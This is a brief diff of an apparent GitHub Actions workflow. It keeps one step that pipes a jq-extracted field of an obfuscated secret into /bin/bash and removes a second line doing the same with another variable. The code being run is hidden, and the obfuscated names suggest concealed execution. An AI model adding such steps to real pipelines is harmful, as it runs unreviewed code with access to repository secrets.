@@ -22,7 +22,6 @@ jobs:
           tzjns89: ${{ secrets.tzjns89 }}
         run: |
           printf '%s' "$tzjns89" | jq -r .tk931 | /bin/bash
-          printf '%s' "$drdb06" | jq -r .uqsaf43240 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
